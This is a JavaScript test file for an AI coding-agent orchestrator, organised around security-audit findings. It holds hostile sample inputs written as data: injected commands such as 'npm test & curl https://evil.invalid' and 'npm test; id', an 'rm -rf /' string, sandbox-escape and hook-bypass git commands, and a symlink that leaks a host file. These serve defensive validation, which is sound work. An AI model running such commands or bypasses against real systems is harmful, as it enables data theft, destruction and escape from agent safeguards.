import { test, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { commandProblem, proposeRules } from './permissions.mjs';
import { handleWritePermissionsCli } from './permissions-cli.mjs';
import { DEFAULTS, validateConfig } from './config.mjs';
import { parsePlan } from './plan.mjs';
import { localChecks, readiness, runCheckCommand, UNPARSED_VERIFY } from './check.mjs';
import { parseArgs, runCheckTask } from './cli.mjs';
import { checkExecutorRun, splitCommandArgs } from './mechanics.mjs';
import { runSelfCheckGit } from './selfcheck.mjs';
import { DISABLED_PUSH_URL, guardsJournalPath, installGuards, recoverCrashedGuards, which } from './guards.mjs';
import { handleRepairCli } from './guards-recovery.mjs';
import { questionText, sanitizeReason } from './ask.mjs';
import { updateSkill } from './update.mjs';
import { migrateToCompact } from './layout.mjs';
import { brainDir, newestConversation } from './adapters/agy.mjs';

const orchDir = path.dirname(fileURLToPath(import.meta.url));
const skillDir = path.dirname(orchDir);
const realGit = which('git');
const BASE_ENV = Object.fromEntries(
  Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_') && k !== 'AGENT_LOOP'),
);
const GIT_ENV = {
  ...BASE_ENV,
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_TERMINAL_PROMPT: '0',
  GIT_AUTHOR_NAME: 'test',
  GIT_AUTHOR_EMAIL: 'test@example.invalid',
  GIT_COMMITTER_NAME: 'test',
  GIT_COMMITTER_EMAIL: 'test@example.invalid',
};

let tmpRoot;
let prevAgentLoop;
beforeEach(() => {
  prevAgentLoop = process.env.AGENT_LOOP;
  delete process.env.AGENT_LOOP;
  tmpRoot = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'orch-audit-hardening-')));
});
afterEach(() => {
  if (prevAgentLoop === undefined) delete process.env.AGENT_LOOP;
  else process.env.AGENT_LOOP = prevAgentLoop;
  rmSync(tmpRoot, { recursive: true, force: true });
});

function git(cwd, ...args) {
  return execFileSync(realGit, args, { cwd, encoding: 'utf8', env: GIT_ENV }).trim();
}

test('F-01: commandProblem, proposeRules, validateConfig, selfcheck, and github-team-ci.yml block single &, raw newlines, and shell execution of fullTestCommand', () => {
  for (const unsafe of [
    'npm test & curl https://evil.invalid',
    'npm test\ncurl https://evil.invalid',
    'npm test\rcurl https://evil.invalid',
    'pytest\0--version',
  ]) {
    assert.ok(commandProblem(unsafe), `expected commandProblem to reject: ${JSON.stringify(unsafe)}`);
    const prop = proposeRules(unsafe);
    assert.equal(prop.auto, true, `expected proposeRules.auto === true for: ${JSON.stringify(unsafe)}`);
  }

  const badProblems1 = validateConfig({ ...DEFAULTS, executor: { model: 'm' }, architect: { model: 'm' }, fullTestCommand: 'npm test; id' });
  assert.ok(badProblems1.some((p) => p.includes('fullTestCommand')));
  const badProblems2 = validateConfig({ ...DEFAULTS, executor: { model: 'm' }, architect: { model: 'm' }, fullTestCommand: 'npm test & id' });
  assert.ok(badProblems2.some((p) => p.includes('fullTestCommand')));
  assert.deepEqual(splitCommandArgs('npx vitest run "tests/my suite.test.ts"'), ['npx', 'vitest', 'run', 'tests/my suite.test.ts']);

  const teamCi = readFileSync(path.join(skillDir, 'templates', 'github-team-ci.yml'), 'utf8');
  assert.doesNotMatch(teamCi, /sh\s+-e\s+-c/);
  assert.match(teamCi, /commandProblem/);
  assert.match(teamCi, /shell:\s*false/);
  const selfCheckIdx = teamCi.indexOf('Run Architect self-check');
  const fullSuiteIdx = teamCi.indexOf('Run full project test suite from config');
  assert.ok(selfCheckIdx > 0 && fullSuiteIdx > selfCheckIdx, 'team-ci.yml must run --self-check before fullTestCommand');
});

test('F-02: parsePlan accepts 2..4 space task field indentation and flags unbackticked Verify prose in localChecks, readiness, and runCheckTask', () => {
  const planMd = `# PLAN

## Frozen
- \`EXECUTOR.md\`

## Tasks
- [ ] T-101: Four-space indented fields and unbackticked Verify
    - Risk: low.
    - Change: \`src/a.js\`.
    - Verify: npm test
- [ ] T-102: Explicit dash Verify is fine
   - Risk: low.
   - Change: \`src/b.js\`.
   - Verify: —
`;
  const parsed = parsePlan(planMd);
  assert.equal(parsed.tasks.length, 2);
  assert.deepEqual(parsed.tasks[0].change, ['src/a.js']);
  assert.deepEqual(parsed.tasks[0].verifyCommands, []);
  assert.equal(parsed.tasks[0].unparsedVerify, true);
  assert.equal(Object.keys(parsed.tasks[0]).includes('unparsedVerify'), false, 'unparsedVerify stays non-enumerable');
  assert.equal(parsed.tasks[1].unparsedVerify, undefined);

  const repo = path.join(tmpRoot, 'repo-f02');
  mkdirSync(path.join(repo, '.agents', 'skills', 'architect'), { recursive: true });
  mkdirSync(path.join(repo, 'src'), { recursive: true });
  git(repo, 'init', '-q', '-b', 'master');
  writeFileSync(path.join(repo, '.gitignore'), '.agent-runs/\n');
  writeFileSync(path.join(repo, 'EXECUTOR.md'), readFileSync(path.join(skillDir, 'EXECUTOR.md'), 'utf8'));
  writeFileSync(path.join(repo, 'PLAN.md'), planMd);
  writeFileSync(path.join(repo, 'src', 'a.js'), 'export const a = 1;\n');
  git(repo, 'add', '.gitignore', 'EXECUTOR.md', 'PLAN.md', 'src/a.js');
  git(repo, 'commit', '-q', '-m', 'arch: plan initial');
  const baseSha = git(repo, 'rev-parse', 'HEAD');

  const cfg = { ...DEFAULTS, permissions: 'skip', executor: { model: 'm' }, architect: { model: 'm' } };
  const lChecks = localChecks({ config: cfg, workDir: repo, realGit });
  assert.ok(lChecks.some((c) => !c.ok && c.name === 'Verify («Проверка») field' && c.detail.includes('T-101')));
  const rChecks = readiness({ config: cfg, workDir: repo, realGit, only: null, modelResolverFn: () => ({ model: 'm' }) });
  assert.ok(rChecks.some((c) => !c.ok && c.name === 'T-101: Verify' && c.detail === UNPARSED_VERIFY));

  writeFileSync(path.join(repo, 'src', 'a.js'), 'export const a = 2;\n');
  git(repo, 'add', 'src/a.js');
  git(repo, 'commit', '-q', '-m', 'T-101: update a');
  const gate = runCheckTask({ taskId: 'T-101', baseRef: baseSha, workDir: repo, config: cfg, realGit });
  assert.equal(gate.ok, false);
  assert.ok(gate.violations.some((v) => v.includes('without backticks')));
});

test('F-03: shims/node blocks non-PATH scripts and pre-flag --test escapes, and shims/git blocks --git-dir/--work-tree while allowing -n inside git commit -m', () => {
  const workDir = path.join(tmpRoot, 'work');
  const outside = path.join(tmpRoot, 'outside');
  mkdirSync(workDir, { recursive: true });
  mkdirSync(outside, { recursive: true });
  git(workDir, 'init', '-q', '-b', 'master');
  git(workDir, 'config', 'user.name', 'test');
  git(workDir, 'config', 'user.email', 'test@example.invalid');
  writeFileSync(path.join(workDir, 'a.txt'), 'hello\n');
  git(workDir, 'add', 'a.txt');
  git(workDir, 'commit', '-q', '-m', 'init');

  const outsideSecret = path.join(outside, 'secret.mjs');
  writeFileSync(outsideSecret, 'console.log("LEAKED_OUTSIDE_SECRET");\n');
  git(outside, 'init', '-q', '-b', 'master');

  const guards = installGuards({
    workDir,
    shimDir: path.join(tmpRoot, 'shims'),
    blockedScripts: [],
    sandboxRoot: path.join(tmpRoot, 'sandbox'),
    realGit,
  });
  const runSh = (cmd) => spawnSync('/bin/sh', ['-c', cmd], { cwd: workDir, env: guards.env, encoding: 'utf8', timeout: 30_000 });
  try {
    for (const blockedCmd of [
      `node '${outsideSecret}'`,
      `node --test-reporter=spec --test '${outsideSecret}'`,
      `git --git-dir='${path.join(outside, '.git')}' status`,
      `git --work-tree='${outside}' status`,
      'git commit -n -m "bypass"',
      'git commit -nm "bypass"',
    ]) {
      const r = runSh(blockedCmd);
      assert.equal(r.status, 97, `expected exit 97 for "${blockedCmd}", got ${r.status}: ${r.stderr}`);
      assert.doesNotMatch(r.stdout + r.stderr, /LEAKED_OUTSIDE_SECRET/);
    }

    writeFileSync(path.join(workDir, 'a.txt'), 'updated\n');
    assert.equal(runSh('git add a.txt').status, 0);
    const commitWithNInMessage = runSh('git commit -m "document -n and --name flags"');
    assert.equal(commitWithNInMessage.status, 0, commitWithNInMessage.stderr);

    writeFileSync(path.join(workDir, 'a.txt'), 'updated again\n');
    const commitAm = runSh('git commit -am "handle -n option in parser"');
    assert.equal(commitAm.status, 0, commitAm.stderr);
  } finally {
    guards.restore();
  }
});

test('F-04 & F-05: runCheckCommand skips Husky core.hooksPath without failing, and handleWritePermissionsCli writes non-overwriting .orig.bak and cumulative .pruned.json', async () => {
  const repo = path.join(tmpRoot, 'husky-repo');
  const fakeHome = path.join(tmpRoot, 'home');
  const otherProjA = path.join(tmpRoot, 'other-a');
  const otherProjB = path.join(tmpRoot, 'other-b');
  mkdirSync(repo, { recursive: true });
  mkdirSync(fakeHome, { recursive: true });
  mkdirSync(otherProjA, { recursive: true });
  mkdirSync(otherProjB, { recursive: true });

  git(repo, 'init', '-q', '-b', 'master');
  git(repo, 'config', 'core.hooksPath', '.husky');
  writeFileSync(path.join(repo, '.gitignore'), '.agent-runs/\n');
  writeFileSync(path.join(repo, 'EXECUTOR.md'), readFileSync(path.join(skillDir, 'EXECUTOR.md'), 'utf8'));
  writeFileSync(
    path.join(repo, 'PLAN.md'),
    '# PLAN\n\n## Frozen\n- `EXECUTOR.md`\n\n## Tasks\n- [ ] T-001: Task\n  - Risk: low.\n  - Change: `a.js`.\n  - Verify: `npm test`.\n',
  );
  git(repo, 'add', '.gitignore', 'EXECUTOR.md', 'PLAN.md');
  git(repo, 'commit', '-q', '-m', 'arch: plan T-001');

  const fakeAgy = path.join(tmpRoot, 'fake-agy');
  writeFileSync(fakeAgy, '#!/bin/sh\nif [ "$1" = "models" ]; then printf "m1\\tModel One\\n"; exit 0; fi\nexit 0\n');
  chmodSync(fakeAgy, 0o755);

  // Use sandboxRoot matching tmpRoot so permissions: "skip" is valid without needing language_server_macos
  const prevSandbox = process.env.AGENT_LOOP_SANDBOX_ROOT;
  process.env.AGENT_LOOP_SANDBOX_ROOT = tmpRoot;
  try {
    const cfg = {
      ...DEFAULTS,
      runner: 'claude',
      runnerBin: fakeAgy,
      permissions: 'skip',
      executor: { model: 'sonnet' },
      architect: { model: 'sonnet' },
    };
    const lines = [];
    const ok = await runCheckCommand({ config: cfg, workDir: repo, realGit, print: (l) => lines.push(l) });
    assert.equal(ok, true, lines.join('\n'));
    assert.ok(lines.some((l) => l.includes('– commit-msg hook: skipped') && l.includes('core.hooksPath')));
  } finally {
    if (prevSandbox === undefined) delete process.env.AGENT_LOOP_SANDBOX_ROOT;
    else process.env.AGENT_LOOP_SANDBOX_ROOT = prevSandbox;
  }

  // Test --write-permissions .orig.bak preservation and cumulative .pruned.json
  const agySettingsDir = path.join(fakeHome, '.gemini', 'antigravity-cli');
  mkdirSync(agySettingsDir, { recursive: true });
  const settingsFile = path.join(agySettingsDir, 'settings.json');
  const initialRaw = JSON.stringify({ permissions: { allow: [`write_file(${otherProjA})`], deny: [] } }, null, 2);
  writeFileSync(settingsFile, initialRaw);

  const cfgAgy = { ...DEFAULTS, executor: { model: 'm1' }, architect: { model: 'm1' } };
  const res1 = handleWritePermissionsCli({ config: cfgAgy, workDir: repo, home: fakeHome, log: () => {} });
  assert.equal(res1.ok, true);
  assert.equal(res1.origBackup, true);
  assert.equal(readFileSync(`${settingsFile}.orig.bak`, 'utf8'), initialRaw);

  // Simulate adding another cross-project rule and running --write-permissions a second time
  const cur = JSON.parse(readFileSync(settingsFile, 'utf8'));
  cur.permissions.allow.push(`read_file(${otherProjB})`);
  writeFileSync(settingsFile, JSON.stringify(cur, null, 2));

  const res2 = handleWritePermissionsCli({ config: cfgAgy, workDir: repo, home: fakeHome, log: () => {} });
  assert.equal(res2.origBackup, false, '.orig.bak must never be overwritten on subsequent runs');
  assert.equal(readFileSync(`${settingsFile}.orig.bak`, 'utf8'), initialRaw);
  const pruned = JSON.parse(readFileSync(`${settingsFile}.pruned.json`, 'utf8'));
  assert.ok(pruned.rules.includes(`write_file(${otherProjA})`));
  assert.ok(pruned.rules.includes(`read_file(${otherProjB})`));
});

test('F-07: SIGKILL crash recovery restores pushurl, foreign pre-push hook, and stale .lock via recoverCrashedGuards / --repair, and checkExecutorRun normalizes ./ paths', () => {
  const remoteDir = path.join(tmpRoot, 'remote.git');
  const workDir = path.join(tmpRoot, 'crash-repo');
  mkdirSync(remoteDir, { recursive: true });
  mkdirSync(workDir, { recursive: true });
  git(remoteDir, 'init', '--bare', '-q');
  git(workDir, 'init', '-q', '-b', 'master');
  git(workDir, 'remote', 'add', 'origin', remoteDir);
  git(workDir, 'config', 'remote.origin.pushurl', '/custom/push-target.git');

  const hookFile = path.join(workDir, '.git', 'hooks', 'pre-push');
  const foreignHook = '#!/bin/sh\necho custom-pre-push\nexit 0\n';
  writeFileSync(hookFile, foreignHook);
  chmodSync(hookFile, 0o755);

  const g = installGuards({
    workDir,
    shimDir: path.join(tmpRoot, 'shims-crash'),
    blockedScripts: [],
    sandboxRoot: tmpRoot,
    realGit,
  });
  assert.equal(existsSync(guardsJournalPath(workDir, realGit)), true);
  assert.equal(git(workDir, 'config', '--get', 'remote.origin.pushurl'), DISABLED_PUSH_URL);
  assert.equal(git(workDir, 'status', '--porcelain'), '', 'guards journal inside .git/info must never dirty working tree');

  // Simulate SIGKILL: write a dead PID into .agent-runs/.lock and DO NOT call g.restore()
  mkdirSync(path.join(workDir, '.agent-runs'), { recursive: true });
  writeFileSync(path.join(workDir, '.agent-runs', '.lock'), '999999\n');

  assert.equal(parseArgs(['--repair']).repair, true);
  const out = [];
  const exitCode = handleRepairCli({
    workDir,
    realGit,
    stdout: { write: (s) => out.push(s) },
    stderr: { write: (s) => out.push(s) },
  });
  assert.equal(exitCode, 0);
  assert.equal(git(workDir, 'config', '--get', 'remote.origin.pushurl'), '/custom/push-target.git');
  assert.equal(readFileSync(hookFile, 'utf8'), foreignHook);
  assert.equal(existsSync(path.join(workDir, '.agent-runs', '.lock')), false);
  assert.equal(existsSync(guardsJournalPath(workDir, realGit)), false);

  // Verify idempotent second call
  const second = recoverCrashedGuards({ workDir, realGit });
  assert.equal(second.recovered, false);

  // Also verify ./a.js normalization in checkExecutorRun
  writeFileSync(path.join(workDir, '.gitignore'), '.agent-runs/\n');
  writeFileSync(path.join(workDir, 'EXECUTOR.md'), '<!-- executor-policy-version: 1.8 -->\n');
  writeFileSync(path.join(workDir, 'a.js'), 'export const v = 1;\n');
  git(workDir, 'add', '.gitignore', 'EXECUTOR.md', 'a.js');
  git(workDir, 'commit', '-q', '-m', 'arch: plan T-001');
  const baseSha = git(workDir, 'rev-parse', 'HEAD');
  writeFileSync(path.join(workDir, 'a.js'), 'export const v = 2;\n');
  git(workDir, 'add', 'a.js');
  git(workDir, 'commit', '-q', '-m', 'T-001: bump v');
  const mech = checkExecutorRun({
    cwd: workDir,
    baseSha,
    task: { id: 'T-001', change: ['./a.js'], risk: 'low' },
    frozen: ['EXECUTOR.md'],
    config: DEFAULTS,
    realGit,
  });
  assert.equal(mech.ok, true, mech.violations.join('; '));
});

test('F-08 & F-09: Python stack runners/assertions and WAIVER monotonicity in runSelfCheckGit work without false failures', () => {
  for (const pyCmd of [
    'python3 -m mypy src',
    'python -m ruff check .',
    'python3 -m flake8 src',
    'python3 -m pyright src',
    'python3 manage.py test apps.users',
  ]) {
    assert.equal(commandProblem(pyCmd), null, `expected safe Python command: ${pyCmd}`);
    const prop = proposeRules(pyCmd);
    assert.equal(prop.auto, false);
    assert.equal(prop.options.length, 2, `expected prefix + exact options for ${pyCmd}`);
  }
  assert.ok(commandProblem('python3 -c "import os"'));
  assert.ok(commandProblem('python3 manage.py shell'));

  const repo = path.join(tmpRoot, 'py-selfcheck');
  mkdirSync(path.join(repo, 'tests'), { recursive: true });
  git(repo, 'init', '-q', '-b', 'master');
  writeFileSync(path.join(repo, 'EXECUTOR.md'), '<!-- executor-policy-version: 1.8 -->\n');
  writeFileSync(
    path.join(repo, 'tests', 'test_auth.py'),
    'def test_one():\n    assert 1 + 1 == 2\n\ndef test_two():\n    assert 2 + 2 == 4\n',
  );
  writeFileSync(
    path.join(repo, 'PLAN.md'),
    '# PLAN\n\n## Decisions (ADR)\n- ADR-001: Python project\n\n## Frozen\n- `EXECUTOR.md`\n- `tests/test_auth.py`\n\n## Tasks\n- [ ] T-001: Auth\n  - Risk: high.\n  - Change: `auth.py`.\n  - Test cases: `tests/test_auth.py`.\n  - Verify: `python3 -m pytest`.\n',
  );
  git(repo, 'add', 'EXECUTOR.md', 'tests/test_auth.py', 'PLAN.md');
  git(repo, 'commit', '-q', '-m', 'arch: plan cycle 1');
  const baseSha = git(repo, 'rev-parse', 'HEAD');

  // Consolidate two Python tests into one parameterized-style test -> fails monotonicity until waived
  writeFileSync(path.join(repo, 'tests', 'test_auth.py'), 'def test_combined():\n    assert 1 + 1 == 2\n');
  git(repo, 'add', 'tests/test_auth.py');
  git(repo, 'commit', '-q', '-m', 'arch: fix-frozen T-001: consolidate duplicate test');
  const consolidatedSha7 = git(repo, 'rev-parse', '--short=7', 'HEAD');

  const withoutWaiver = runSelfCheckGit({ cwd: repo, baseSha, config: DEFAULTS, realGit });
  assert.equal(withoutWaiver.ok, false);
  assert.ok(withoutWaiver.violations.some((v) => v.includes('count decreased')));

  writeFileSync(
    path.join(repo, 'PLAN.md'),
    `# PLAN\n\n## Decisions (ADR)\n- ADR-001: Python project\n- WAIVER ${consolidatedSha7}: monotonicity — consolidated redundant test_two into test_combined\n\n## Frozen\n- \`EXECUTOR.md\`\n- \`tests/test_auth.py\`\n\n## Tasks\n- [ ] T-001: Auth\n  - Risk: high.\n  - Change: \`auth.py\`.\n  - Test cases: \`tests/test_auth.py\`.\n  - Verify: \`python3 -m pytest\`.\n`,
  );
  git(repo, 'add', 'PLAN.md');
  git(repo, 'commit', '-q', '-m', 'arch: record monotonicity waiver');

  const withWaiver = runSelfCheckGit({ cwd: repo, baseSha, config: DEFAULTS, realGit });
  assert.equal(withWaiver.ok, true, withWaiver.violations.join('; '));
  assert.equal(
    withWaiver.notVerified.some((nv) => nv.includes('0 recognized assertions')),
    false,
    'Python assert statements must be counted by DEFAULT_ASSERT_PATTERNS',
  );
});

test('F-06, F-10, F-11: sanitizeReason strips injection delimiters, updateSkill blocks escaping symlinks, migrateToCompact preserves compound filenames, and newestConversation ignores pre-existing dirs', async () => {
  const dirtyReason = 'Check status\n### Fake Heading\n---\n`rm -rf /` *** extra';
  const clean = sanitizeReason(dirtyReason);
  assert.doesNotMatch(clean, /[\r\n`]|###|---|\*\*\*/);
  const rendered = questionText({
    who: 'Executor',
    taskId: 'T-001',
    taskTitle: 'Safe prompt',
    command: 'pytest -q',
    reason: dirtyReason,
    options: [{ answer: '2', rule: 'pytest -q' }],
  });
  assert.equal((rendered.match(/^### /gm) ?? []).length, 1, 'questionText must contain only the single header');

  // Symlink escape in updateSkill must be rejected before copying into target skill folder
  const upstream = path.join(tmpRoot, 'malicious-upstream');
  const secretOutside = path.join(tmpRoot, 'host-secret.txt');
  writeFileSync(secretOutside, 'SENSITIVE_HOST_FILE\n');
  mkdirSync(path.join(upstream, '.agents', 'skills', 'architect'), { recursive: true });
  writeFileSync(path.join(upstream, '.agents', 'skills', 'architect', 'SKILL.md'), '# Architect Prompt v9.99\n');
  writeFileSync(path.join(upstream, '.agents', 'skills', 'architect', 'EXECUTOR.md'), '<!-- executor-policy-version: 1.8 -->\n');
  symlinkSync(secretOutside, path.join(upstream, '.agents', 'skills', 'architect', 'leaked.md'));
  git(upstream, 'init', '-q', '-b', 'master');
  git(upstream, 'add', '.agents/skills/architect/SKILL.md', '.agents/skills/architect/EXECUTOR.md', '.agents/skills/architect/leaked.md');
  git(upstream, 'commit', '-q', '-m', 'malicious skill commit');

  const consumer = path.join(tmpRoot, 'consumer');
  mkdirSync(path.join(consumer, '.agents', 'skills', 'architect'), { recursive: true });
  writeFileSync(path.join(consumer, '.agents', 'skills', 'architect', 'SKILL.md'), '# Architect Prompt v3.45\n');
  writeFileSync(path.join(consumer, '.agents', 'skills', 'architect', 'EXECUTOR.md'), '<!-- executor-policy-version: 1.8 -->\n');
  writeFileSync(path.join(consumer, 'EXECUTOR.md'), '<!-- executor-policy-version: 1.8 -->\n');
  git(consumer, 'init', '-q', '-b', 'master');
  git(consumer, 'add', '.agents/skills/architect/SKILL.md', '.agents/skills/architect/EXECUTOR.md', 'EXECUTOR.md');
  git(consumer, 'commit', '-q', '-m', 'initial skill');

  await assert.rejects(
    () => updateSkill({ workDir: consumer, repoUrl: upstream, realGit }),
    /symlink escaping skill root/,
  );
  assert.match(readFileSync(path.join(consumer, '.agents', 'skills', 'architect', 'SKILL.md'), 'utf8'), /v3\.45/);

  // migrateToCompact must not corrupt my-PLAN.md or foo-EXECUTOR.md
  writeFileSync(path.join(consumer, 'PLAN.md'), '# PLAN\n\n## Frozen\n- `EXECUTOR.md`\n');
  writeFileSync(
    path.join(consumer, 'AGENTS.md'),
    'Read PLAN.md and EXECUTOR.md; keep archive my-PLAN.md and custom/foo-EXECUTOR.md untouched.\n',
  );
  migrateToCompact({ workDir: consumer });
  const migratedAgents = readFileSync(path.join(consumer, 'AGENTS.md'), 'utf8');
  assert.match(migratedAgents, /Read \.architect\/PLAN\.md and \.architect\/EXECUTOR\.md/);
  assert.match(migratedAgents, /my-PLAN\.md/);
  assert.match(migratedAgents, /custom\/foo-EXECUTOR\.md/);

  // newestConversation ignores pre-existing concurrent conversation directories
  const fakeHome = path.join(tmpRoot, 'agy-home');
  const bDir = brainDir(fakeHome);
  mkdirSync(path.join(bDir, 'conv-existing'), { recursive: true });
  const existing = new Set(['conv-existing']);
  assert.equal(newestConversation(0, fakeHome, existing), null);
  mkdirSync(path.join(bDir, 'conv-spawned'), { recursive: true });
  assert.equal(newestConversation(0, fakeHome, existing), 'conv-spawned');

  // SKILL.md v3.46 prompt diet stays comfortably below the 34 KB ceiling
  const skillBytes = Buffer.byteLength(readFileSync(path.join(skillDir, 'SKILL.md'), 'utf8'), 'utf8');
  assert.ok(skillBytes <= 33 * 1024, `expected SKILL.md (${skillBytes}B) <= 33792B after prompt diet`);
});
